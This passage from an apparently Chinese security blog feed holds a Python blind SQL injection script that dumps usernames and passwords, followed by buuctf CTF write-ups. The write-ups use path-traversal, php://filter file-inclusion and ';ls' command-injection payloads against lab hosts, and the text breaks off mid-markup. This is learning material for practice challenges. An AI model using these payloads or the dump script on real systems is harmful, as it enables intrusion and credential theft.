id="猜解username-password"><a class="markdownIt-Anchor" href="#猜解username-password">#</a> 猜解 username、password</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    username = &#123;&#125;</span><br><span class="line">    password = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,dump_num):</span><br><span class="line">        str_i = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dump_num):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                k = <span class="number">1</span></span><br><span class="line">                p = <span class="number">1</span></span><br><span class="line">                low = <span class="number">32</span></span><br><span class="line">                high = <span class="number">126</span></span><br><span class="line">                uname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                pword = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">while</span> k &lt;= user_len[j]:</span><br><span class="line">                    str_k = <span class="built_in">str</span>(k)</span><br><span class="line">                    <span class="keyword">if</span> (low + high) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                        mid = (low + high) / <span class="number">2</span></span><br><span class="line">                    <span class="keyword">elif</span> (low + high) %<span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                        mid = (low + high + <span class="number">1</span>) / <span class="number">2</span></span><br><span class="line">                    str_mid = <span class="built_in">str</span>(mid)</span><br><span class="line">                    user_url = url + <span class="string">&quot;&#x27; and ascii(substr((select username from &quot;</span>+db_name+<span class="string">&quot;.&quot;</span>+table_name+<span class="string">&quot; limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_k+<span class="string">&quot;,1))=&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                    r = requests.get(user_url)</span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                        uname += <span class="built_in">chr</span>(<span class="built_in">int</span>(mid))</span><br><span class="line">                        <span class="built_in">print</span>(<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;| usename：&quot;</span>+uname)</span><br><span class="line">                        k = k+<span class="number">1</span></span><br><span class="line">                        low = <span class="number">32</span></span><br><span class="line">                        high = <span class="number">126</span></span><br><span class="line">                    <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        user_url = url + <span class="string">&quot;&#x27; and ascii(substr((select username from &quot;</span>+db_name+<span class="string">&quot;.&quot;</span>+table_name+<span class="string">&quot; limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_k+<span class="string">&quot;,1))&gt;&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                        r = requests.get(user_url)</span><br><span class="line">                        <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                            low = mid</span><br><span class="line">                        <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                            high = mid</span><br><span class="line">                username[<span class="built_in">str</span>(j)] = <span class="built_in">str</span>(uname)</span><br><span class="line">                <span class="keyword">while</span> p &lt;= pass_len[j]:</span><br><span class="line">                    str_p = <span class="built_in">str</span>(p)</span><br><span class="line">                    <span class="keyword">if</span> (low + high) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                        mid = (low + high) / <span class="number">2</span></span><br><span class="line">                    <span class="keyword">elif</span> (low + high) %<span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                        mid = (low + high + <span class="number">1</span>) / <span class="number">2</span></span><br><span class="line">                    str_mid = <span class="built_in">str</span>(mid)</span><br><span class="line">                    pass_url = url + <span class="string">&quot;&#x27; and ascii(substr((select password from &quot;</span>+db_name+<span class="string">&quot;.&quot;</span>+table_name+<span class="string">&quot; limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_p+<span class="string">&quot;,1))=&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                    r = requests.get(pass_url)</span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                        pword += <span class="built_in">chr</span>(<span class="built_in">int</span>(mid))</span><br><span class="line">                        <span class="built_in">print</span>(<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;| password：&quot;</span>+pword)</span><br><span class="line">                        p = p+<span class="number">1</span></span><br><span class="line">                        low = <span class="number">32</span></span><br><span class="line">                        high = <span class="number">126</span></span><br><span class="line">                    <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        pass_url = url + <span class="string">&quot;&#x27; and ascii(substr((select password from &quot;</span>+db_name+<span class="string">&quot;.&quot;</span>+table_name+<span class="string">&quot; limit &quot;</span>+str_i+<span class="string">&quot;,1),&quot;</span>+str_p+<span class="string">&quot;,1))&gt;&quot;</span>+str_mid+<span class="string">&quot;--+&quot;</span></span><br><span class="line">                        r = requests.get(pass_url)</span><br><span class="line">                        <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                            low = mid</span><br><span class="line">                        <span class="keyword">elif</span> flag <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                            high = mid</span><br><span class="line">                password[<span class="built_in">str</span>(j)] = <span class="built_in">str</span>(pword)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">13</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;|&quot;</span>+<span class="built_in">str</span>(x+<span class="number">1</span>)+<span class="string">&quot;|username:&quot;</span>+username[<span class="built_in">str</span>(x)]+<span class="string">&quot;|password:&quot;</span>+password[<span class="built_in">str</span>(x)]+<span class="string">&quot;|&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习一下 python 写盲注脚本&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="https://dr4x3zz.github.io/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="SQL注入" scheme="https://dr4x3zz.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题</title>
    <link href="https://dr4x3zz.github.io/2023/04/06/buuctf%E5%88%B7%E9%A2%98/"/>
    <id>https://dr4x3zz.github.io/2023/04/06/buuctf%E5%88%B7%E9%A2%98/</id>
    <published>2023-04-06T02:08:34.000Z</published>
    <updated>2023-04-19T14:29:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>因为校赛要开始了，所以来刷刷题多见见世面</p><span id="more"></span><h2 id="hctf-2018warmup1"><a class="markdownIt-Anchor" href="#hctf-2018warmup1">#</a> [HCTF 2018]WarmUp1</h2><p>点进连接，一个滑稽</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/a.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/a.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查看网页源代码</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/b.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/b.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>提示有一个 source.php 文件，访问</p><p>页面显示代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>有个 hint.php 访问一下</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/c.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>知道 flag 在 ffffllllaaaagggg 文件里</p><p>分析一下代码</p><p>继续审计代码前先看几个函数：</p><ul><li><p>mb_substr () 函数返回字符串的一部分。substr () 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr ()。<br>注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</p></li><li><p>mb_strpos (haystack ,needle) 查找字符串在另一个字符串中首次出现的位置</p><p>haystack：要被检查的字符串；needle：要搜索的字符串</p></li><li><p>mb_substr () 函数返回字符串的一部分</p></li><li><p>in_array () 函数搜索数组中是否存在指定的值。<br>注释：如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。</p></li><li><p>urldecode ()：解码已编码的 URL 字符串</p></li><li><p>empty () 函数用于检查一个变量是否为空。<br>empty () 判断一个变量是否被认为是空的。当一个变量并不存在，或者它 的值等同于 FALSE，那么它会被认为不存在。如果变量不存在的话，empty () 并不会产生警告。<br>empty () 5.5 版本之后支持表达式了，而不仅仅是变量。</p></li><li><p>. 表示当前目录<br>. . 表示当前目录的上一级目录。<br>. ./ 表示当前目录下的某个文件或文件夹，视后面跟着的名字而定<br>./ 表示当前目录上一级目录的文件或文件夹，视后面跟着的名字而定。<br>例如：<br>文件夹 a<br> 下面有 文件夹 b c 和文件 d。<br>文件夹 b 下面有 e.php 和文件 f。<br>则 e 中的。表示 文件夹 b<br>./f 表示 b 下面的文件 f。<br>. . 表示 a 文件夹。<br>. ./d 表示 a 文件夹下的 d 文件。</p></li></ul><p>学习链接：</p><p><a href="https://blog.csdn.net/m0_53314778/article/details/112629012">https://blog.csdn.net/m0_53314778/article/details/112629012</a></p><p><a href="https://blog.csdn.net/qq_41523170/article/details/107590435">https://blog.csdn.net/qq_41523170/article/details/107590435</a></p><p>ok 开始代码审计</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/d.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>底部的 if 语句中有三个条件，一个判断文件不能为空，意思是是否传递了 file 参数，第二个传的参数是字符串，第三个是白名单检测，通过上方的 emmm 函数来检测</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/e.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/e.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>白名单为 source.php 和 hint.php，且函数里有 mb_strpos 和 mb_substr 截取内容，碰到？就截止了，所以我们在绕过白名单时多添加一个就可以绕过白名单 source.php?file=source.php? ，再用…/ 逐级跳转目录读取 flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];<span class="comment">//白名单</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;<span class="comment">//判断参数$page为空或者不是字符串时输出you can&#x27;t see it</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="comment">//如果$page参数为白名单中的内容返回true</span></span><br><span class="line">    </span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//查找?号出现的第一个位置</span><br><span class="line">            );<span class="comment">//如果$page的值有？则从?之前提取字符串</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>); <span class="comment">//url对$page解码</span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );<span class="comment">//第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="comment">//第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><a href="http://508337d2-4f77-4847-ba92-04461d8b0411.node4.buuoj.cn:81/source.php?file=source.php?../ffffllllaaaagggg">http://508337d2-4f77-4847-ba92-04461d8b0411.node4.buuoj.cn:81/source.php?file=source.php?../ffffllllaaaagggg</a>无 flag</p><p><a href="http://508337d2-4f77-4847-ba92-04461d8b0411.node4.buuoj.cn:81/source.php?file=source.php?../../ffffllllaaaagggg">http://508337d2-4f77-4847-ba92-04461d8b0411.node4.buuoj.cn:81/source.php?file=source.php?../../ffffllllaaaagggg</a>再上一级还是无 flag</p><p>依次增加…/</p><p><a href="http://508337d2-4f77-4847-ba92-04461d8b0411.node4.buuoj.cn:81/source.php?file=source.php?../../../../../ffffllllaaaagggg">http://508337d2-4f77-4847-ba92-04461d8b0411.node4.buuoj.cn:81/source.php?file=source.php?../../../../../ffffllllaaaagggg</a></p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/f.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/f.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 6df2ed82-1474-4fb1-8f08-ada217f50981>flag</p><h2 id="actf2020-新生赛include1"><a class="markdownIt-Anchor" href="#actf2020-新生赛include1">#</a> [ACTF2020 新生赛] Include1</h2><p>启动靶机</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/g.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/g.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>点击 tips，查看网页有什么变化</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/h.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/h.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/i.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/i.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可发现是文件包含，已经明确给出，文件包含直接读取的是文件，而不是文件源码，所以要想办法读取源码方法。<br>那么就要涉及到 PHP 伪协议，这个是之前刚接触 ctf 学习时碰到的东西，记得还写了一个博客，重新学习一下 PHP 伪协议</p><p>后续重新写一个学习 php 伪协议的博客吧</p><p>了解了 PHP 伪协议后，那么此处应当使用 ：php://filter 读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了。</p><p>构造 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://6e8cf394-7f9c-46d0-aaf6-1f2742baf857.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/j.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/j.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="actf2020-新生赛exec-1"><a class="markdownIt-Anchor" href="#actf2020-新生赛exec-1">#</a> [ACTF2020 新生赛] Exec 1</h2><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/k.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/k.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>输入 127.0.0.1;ls 试一试，ls 可以查看目录</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/l.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/l.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到这个目录下有一个 index.php 文件，并且能回显且；没有被过滤，给我的感觉就很想 sqli-lab 的堆叠注入</p><p>接着我们就遍历目录了，通过 cd …/ 达到访问上一个目录的目的，再通过 ls 达到查看该目录有哪些文件</p><p>当访问到…/…/…/ 时就可以看到有一个 flag</p><p>127.0.0.1;cd …/…/…/;ls</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/m.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/m.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>我起初还以为时一个文件夹，就访问一下，结果访问结果让我有点懵</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/n.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/n.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>难道这个不是一个文件夹，导致我访问不了吗，我有输入了一个不存在上一个目录的名字</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/o.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/o.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>回显结果一致，我猜测应该是不存在这个 flag 文件夹导致无法查看</p><p>所以 flag 就在这个目录下不用，直接读取 flag 这个文件</p><p>这里要用到 cat 这个指令</p><blockquote><p>cat 主要有三大功能：</p><p>1. 显示整个文件:cat filename</p><p>2. 创建一个文件:cat &gt; filename 只能创建新文件，不能编辑已有文件.</p><p>3. 合并文件:cat file1 file2 &gt; file</p></blockquote><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/p.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/p.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>构建 payload</p><figure class="highlight plaintext"><table><tr><td 